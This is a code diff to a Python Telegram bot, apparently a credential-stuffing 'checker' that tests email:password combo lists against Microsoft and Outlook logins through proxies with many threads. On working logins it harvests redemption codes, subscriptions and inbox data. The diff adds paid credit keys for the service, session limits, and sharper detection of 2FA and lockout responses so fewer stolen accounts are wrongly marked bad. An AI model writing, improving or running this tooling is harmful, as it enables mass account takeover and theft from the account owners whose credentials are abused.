@@ -92,6 +92,8 @@ class AkazaDatabase:
         self._execute('''CREATE TABLE IF NOT EXISTS results (
             id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT,
             status TEXT, details TEXT, date TEXT)''')
+        self._execute('''CREATE TABLE IF NOT EXISTS keys (
+            key_code TEXT PRIMARY KEY, amount INTEGER)''')
         self.add_user(ADMIN_ID, "Admin", "Admin")
         self._execute('UPDATE users SET is_mod = 1, has_access = 1, credits = 999999 WHERE user_id = ?', (ADMIN_ID,))
 
@@ -198,6 +200,18 @@ class AkazaDatabase:
         res = self._execute('SELECT user_id, username FROM users WHERE is_mod = 1', fetchall=True)
         return [{'uid': row['user_id'], 'username': row['username']} for row in res] if res else []
 
+    def create_key(self, amount: int) -> str:
+        key_code = f"AKAZA-{str(uuid.uuid4()).split('-')[0].upper()}-{str(uuid.uuid4()).split('-')[1].upper()}"
+        self._execute('INSERT INTO keys (key_code, amount) VALUES (?, ?)', (key_code, amount))
+        return key_code
+
+    def get_key_amount(self, key_code: str) -> int:
+        res = self._execute('SELECT amount FROM keys WHERE key_code = ?', (key_code,), fetchone=True)
+        return res['amount'] if res else 0
+
+    def delete_key(self, key_code: str):
+        self._execute('DELETE FROM keys WHERE key_code = ?', (key_code,))
+
 akaza_db = AkazaDatabase(DB)
 
 # ============================================================================
@@ -301,8 +315,12 @@ class AkazaChecker:
                         tk = parse_qs(urlparse(r3.url).fragment).get('access_token', [None])[0]
                         if tk and tk != 'None': return ('TOKEN', tk)
                     except: pass
-                if any(v in r.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt=']): return ('2FA', None)
-                if any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist", 'too many times', 'help us protect']): return ('BAD', None)
+                if any(v in r.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt=', 'help us protect']): 
+                    return ('2FA', None)
+                if any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist"]): 
+                    return ('BAD', None)
+                if 'too many times' in r.text.lower():
+                    return ('ERROR', None)
             except: pass
         return ('ERROR', None)
 
@@ -387,8 +405,11 @@ class AkazaChecker:
             resp_low = r3.text.lower()
             if any(x in resp_low for x in ["account or password is incorrect", "password is incorrect", "doesn't exist"]):
                 return None, None
-            if any(x in r3.text for x in ["identity/confirm", "Consent", "/Abuse"]):
-                return None, None
+            if any(x in r3.text for x in ["identity/confirm", "Consent", "/Abuse", "help us protect", "recover?mkt"]):
+                # Signal 2FA/Secure to avoid marking as BAD
+                return "2FA", None
+            if "too many times" in resp_low:
+                return "RETRY", None
 
             # Extract auth code
             loc = r3.headers.get("Location", "")
@@ -544,14 +565,14 @@ class AkazaChecker:
                         if rm: ru = rm.group(1).strip(); break
 
                     if code_v:
-                        codes.append({'code': code_v, 'category': cat, 'redemption_url': ru, 'date': date})
+                        codes.append({'code': code_v, 'category': cat, 'title': title, 'redemption_url': ru, 'date': date})
                 else:
                     # No button — direct cell text
                     code_text = cells[3].get_text(strip=True) if len(cells) > 3 else cells[2].get_text(strip=True)
                     for pat in CODE_PATTERNS:
                         m = re.search(pat, code_text)
                         if m and '*' not in m.group() and m.group().upper() not in EXCLUDE_WORDS:
-                            codes.append({'code': m.group(), 'category': cat, 'redemption_url': '', 'date': date}); break
+                            codes.append({'code': m.group(), 'category': cat, 'title': title, 'redemption_url': '', 'date': date}); break
         except Exception as e:
             logger.debug(f"get_redemption_codes error: {e}")
         return codes
@@ -865,8 +886,15 @@ class AkazaChecker:
 
             # ── STEP 2: Outlook OAuth2 login (p7.py/hit.py — secondary) ─
             out_checker = make_checker()
-            outlook_token, cid_out = await loop.run_in_executor(
+            outlook_res = await loop.run_in_executor(
                 bot_executor, out_checker._outlook_login, email, password)
+            
+            if outlook_res == ("2FA", None):
+                return {'status': '2fa', 'email': email, 'password': password}
+            if outlook_res == ("RETRY", None):
+                return {'status': 'error', 'email': email, 'password': password}
+                
+            outlook_token, cid_out = outlook_res
             outlook_ok = bool(outlook_token and cid_out)
 
             # If neither succeeded → bad
@@ -958,6 +986,8 @@ class AkazaChecker:
 # ============================================================================
 user_proxies = {}
 pending_files = {}
+active_sessions = set()
+stop_flags = {}
 
 async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
     uid = u.effective_user.id
@@ -1035,6 +1065,18 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
     px = user_proxies.get(uid, []) or PROXIES_LIST
     thr = min(s['threads'], 300) if px else min(s['threads'], 10)
 
+    if uid != ADMIN_ID:
+        if len(active_sessions) >= 3:
+            await (u.callback_query.message.reply_text("⚠️ <b>Bot Busy!</b> Only 3 users can check at a time. Please wait.", parse_mode="HTML") if u.callback_query else u.message.reply_text("⚠️ <b>Bot Busy!</b> Only 3 users can check at a time. Please wait.", parse_mode="HTML"))
+            return
+    else:
+        for _uid in list(active_sessions):
+            if _uid != ADMIN_ID:
+                stop_flags[_uid] = True
+
+    active_sessions.add(uid)
+    stop_flags[uid] = False
+
     status_msg = await (u.callback_query.message.reply_text("🚀 Starting session...") if u.callback_query else u.message.reply_text("🚀 Starting session..."))
     hits, bad, tfa, err, checked, start_t, last_up, last_h = 0, 0, 0, 0, 0, time.time(), 0, []
     all_hits_results, points_results, ms_hits_results, codes_results, inbox_results = [], [], [], [], []
@@ -1042,8 +1084,10 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
     sem, up_lock = asyncio.Semaphore(thr), asyncio.Lock()
 
     async def worker(line):
+        if stop_flags.get(uid): return
         nonlocal hits, bad, tfa, err, checked, last_up, last_h
         async with sem:
+            if stop_flags.get(uid): return
             try:
                 parts = line.split(':', 1)
                 p = random.choice(px) if px else None
@@ -1087,14 +1131,22 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                     if mc.get('capes'): msg += f" (Capes: {', '.join(mc['capes'])})"
                     msg += "\n"
 
-                # Codes
+                # Codes (Consolidated hit.py/flux.py style)
                 codes = data.get('codes', [])
                 if codes:
                     cat_map = {}
                     for co in codes: 
                         cat = co.get('category','Unknown')
                         cat_map.setdefault(cat, []).append(co)
-                        codes_results.append(f"{email}:{password} | {cat}: {co['code']} {co.get('redemption_url','')}")
+                    
+                    # Consolidate for codes.txt
+                    c_list_str = []
+                    for i, co in enumerate(codes, 1):
+                        c_info = f"[{i}] {co['code']} ({co.get('title','N/A')})"
+                        if co.get('redemption_url'): c_info += f" URL: {co['redemption_url']}"
+                        c_list_str.append(c_info)
+                    codes_results.append(f"{email}:{password} | {' | '.join(c_list_str)}")
+
                     msg += "🎁 <b>Codes:</b>\n"
                     for cat, clist in cat_map.items():
                         c_strs = [f"<code>{co['code']}</code>" + (f" <a href=\"{co['redemption_url']}\">[Redeem]</a>" if co.get('redemption_url') else "") for co in clist]
@@ -1103,12 +1155,14 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                 # Subscriptions
                 subs_data = data.get('subs', {})
                 subs = subs_data.get('subs', [])
-                active = [su for su in subs if not su.get('is_expired')]
-                if active:
+                if subs:
                     sub_lines = []
-                    for su in active:
+                    for su in subs:
                         s_str = su['name']
-                        if 'days_remaining' in su: s_str += f" ({su['days_remaining']}d)"
+                        if su.get('is_expired'):
+                            s_str += " (expired !!)"
+                        elif 'days_remaining' in su:
+                            s_str += f" ({su['days_remaining']} Days left)"
                         sub_lines.append(s_str)
                     msg += f"💎 <b>Subscriptions:</b> {', '.join(sub_lines)}\n"
                 
@@ -1154,10 +1208,18 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
 
     tasks = []
     for line in lines:
-        if akaza_db.is_banned(uid): break
+        if akaza_db.is_banned(uid) or stop_flags.get(uid): break
         tasks.append(asyncio.create_task(worker(line)))
         if len(tasks) % 10 == 0: await asyncio.sleep(0.1) # Tiny delay to stagger
     if tasks: await asyncio.gather(*tasks)
+
+    if uid in active_sessions:
+        active_sessions.remove(uid)
+
+    if stop_flags.get(uid):
+        await status_msg.edit_text("⚠️ <b>Session Stopped:</b> An Admin has initiated a check. Your session has been paused.", parse_mode="HTML")
+        if uid in user_proxies: del user_proxies[uid]
+        return
 
     # FINAL REPORTING (FILES TO ADMIN)
     user_handle = f"@{u.effective_user.username}" if u.effective_user.username else u.effective_user.first_name
@@ -1190,6 +1252,7 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
 
     await status_msg.edit_text(f"✅ <b>Check Complete!</b>\n\nTotal: <code>{len(lines)}</code>\nHits: <code>{hits}</code>\n\n<i>All results have been sent to you as files.</i>", parse_mode="HTML")
     if uid in user_proxies: del user_proxies[uid]
+    if uid in active_sessions: active_sessions.remove(uid)
 
 async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
     q = u.callback_query; await q.answer(); uid = q.from_user.id
@@ -1234,6 +1297,21 @@ async def cmd_check(u: Update, c: ContextTypes.DEFAULT_TYPE):
     if not c.args or ':' not in c.args[0]: return
     await handle_combo(u, c, c.args[0])
 
+async def cmd_redeem(u: Update, c: ContextTypes.DEFAULT_TYPE):
+    uid = u.effective_user.id
+    if akaza_db.is_banned(uid): return
+    if not c.args:
+        await u.message.reply_text("⚠️ Usage: /redeem <key>")
+        return
+    key_code = c.args[0]
+    amount = akaza_db.get_key_amount(key_code)
+    if amount > 0:
+        akaza_db.add_credits(uid, amount)
+        akaza_db.delete_key(key_code)
+        await u.message.reply_text(f"✅ <b>Successfully Redeemed!</b>\nYou have received <code>{amount}</code> credits.", parse_mode="HTML")
+    else:
+        await u.message.reply_text("❌ <b>Invalid or already redeemed key.</b>", parse_mode="HTML")
+
 async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
     uid = u.effective_user.id
     if not akaza_db.is_mod(uid): return
@@ -1259,12 +1337,16 @@ async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
                 except: pass
             await u.message.reply_text(f"✅ Sent to {count} users.")
         elif cmd == "!!setthreads" and len(args) >= 2: akaza_db.update_settings(int(args[0]), threads=int(args[1])); await u.message.reply_text("✅")
+        elif cmd == "!!genkey" and args:
+            amount = int(args[0])
+            key_code = akaza_db.create_key(amount)
+            await u.message.reply_text(f"✅ <b>Key Generated:</b>\n<code>{key_code}</code>\nCredits: {amount}", parse_mode="HTML")
         elif cmd == "!!addproxies":
             pxs = u.message.text[len(cmd):].strip().splitlines()
             for p in pxs:
                 if p.strip(): PROXIES_LIST.append(AkazaChecker().format_proxy(p.strip()))
             await u.message.reply_text(f"✅ Added {len(pxs)} global proxies.")
-        elif cmd == "!!help": await u.message.reply_text("!!addcredits !!setcredits !!resetcredits !!grant !!revoke !!addaccess !!ban !!unban !!mod !!unmod !!listmods !!info !!stats !!broadcast !!setthreads !!addproxies")
+        elif cmd == "!!help": await u.message.reply_text("!!addcredits !!setcredits !!resetcredits !!grant !!revoke !!addaccess !!ban !!unban !!mod !!unmod !!listmods !!info !!stats !!broadcast !!setthreads !!genkey !!addproxies")
     except Exception as e: await u.message.reply_text(f"❌ {e}")
 
 def main():
@@ -1276,6 +1358,7 @@ def main():
     app.add_handler(CommandHandler("addkw", cmd_addkw))
     app.add_handler(CommandHandler("skw", cmd_skw)); app.add_handler(CommandHandler("ckw", cmd_ckw))
     app.add_handler(CommandHandler("check", cmd_check))
+    app.add_handler(CommandHandler("redeem", cmd_redeem))
     app.add_handler(CommandHandler("fastmode", lambda u,c: akaza_db.update_settings(u.effective_user.id, fast_mode=not akaza_db.get_user_settings(u.effective_user.id)['fast_mode']) or u.message.reply_text("✅")))
     app.add_handler(CallbackQueryHandler(cb_handler))
     app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^!!'), admin_cmd_handler))
